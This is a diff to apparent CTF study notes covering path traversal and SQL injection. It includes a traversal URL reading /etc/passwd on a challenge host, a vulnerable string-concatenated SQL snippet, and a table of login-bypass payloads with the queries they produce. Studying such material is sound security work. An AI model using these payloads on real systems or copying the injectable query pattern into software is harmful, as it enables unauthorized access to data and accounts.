@@ -37,10 +37,40 @@ Which is the default Apache DocumentRoot folder?
 /var/www/html
 
 Which is an interesting file for reading while watching soap opera?
+
 /etc/passwd
 
-Then, navigating to http://ctf.42barcelona.com:3319/../../../etc/passwd would be a potential test for a path traversal attack
+Then, navigating to http://ctf.42barcelona.com:3319/../../../etc/passwd would be a potential test for a path traversal attack.
 
-  ![Deeper knowledge Path traversal and a prevention technic.](https://portswigger.net/web-security/file-path-traversal)
+
+  [Deeper knowledge Path traversal and a prevention technic.](https://portswigger.net/web-security/file-path-traversal)
 
   
+**sql injection** 
+SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an answer that front-end will unknowingly run on server database an SQL statement that extract information towards the attackant.
+
+There is a potential dangers of using user input directly in in SQL statements.
+
+A regular procedure like
+
+```
+txtUserId = getRequestString("UserId");
+txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
+```
+
+makes possible to the user transform it into>
+
+
+|User name	|Password	|SQL Query                                                                  |
+|-----------|---------|-------------------------------------------------------------------------- |
+|tom	|tom	|SELECT * FROM users WHERE name='tom' and password='tom'|
+|tom	|' or '1'='1	|SELECT * FROM users WHERE name='tom' and password='' or '1'='1'|
+|tom	|' or 1='1	|SELECT * FROM users WHERE name='tom' and password='' or 1='1'|
+|tom	|1' or 1=1 -- -	|SELECT * FROM users WHERE name='tom' and password='' or 1=1-- -'|
+|' or '1'='1	|' or '1'='1	|SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1'|
+|' or ' 1=1	|' or ' 1=1	|SELECT * FROM users WHERE name='' or ' 1=1' and password='' or ' 1=1'|
+|1' or 1=1 -- -	|blah	|SELECT * FROM users WHERE name='1' or 1=1 -- -' and password='blah'|
+
+
+[Too know more](https://portswigger.net/web-security/sql-injection)
+[Common injection for user password](https://sechow.com/bricks/docs/login-1.html)
